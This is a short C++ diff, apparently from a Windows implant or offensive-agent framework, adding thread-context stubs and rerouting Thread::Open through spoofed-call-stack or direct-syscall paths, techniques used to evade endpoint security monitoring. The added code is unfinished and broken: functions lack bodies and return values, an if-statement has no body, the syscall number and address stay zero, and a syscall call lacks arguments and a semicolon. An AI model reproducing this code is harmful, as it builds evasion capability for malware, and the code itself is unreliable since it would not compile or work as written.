@@ -76,11 +76,41 @@ auto DECLFN Thread::Create(
     return Handle;
 }
 
+auto DECLFN Thread::SetCtx(
+    HANDLE  Handle,
+    CONTEXT Ctx
+) -> BOOL {
+    BOOL Success = FALSE;
+
+    
+}
+
+auto DECLFN Thread::GetCtx(
+    HANDLE  Handle,
+    CONTEXT Ctx
+) -> BOOL {
+    BOOL Success = FALSE;
+}
+
 auto DECLFN Thread::Open(
     _In_ ULONG RightAccess,
     _In_ BOOL  Inherit,
     _In_ ULONG ThreadID
 ) -> HANDLE {
+    if ( Self->Spf->Enabled || Self->Sys->Enabled ) {
+        UPTR Address = 0;
+        UPTR Ssn     = 0;
+
+        if ( Self->Spf->Enabled )
+
+        return (HANDLE)Self->Spf->Call( 
+            Address, Ssn, (UPTR)RightAccess, (UPTR)Inherit, (UPTR)ThreadID
+        );
+    } else if ( ! Self->Spf->Enabled && Self->Sys->Enabled ) {
+        SyscallExec(  )
+    }
+
+
     return Self->Krnl32.OpenThread( RightAccess, Inherit, ThreadID );
 }
 
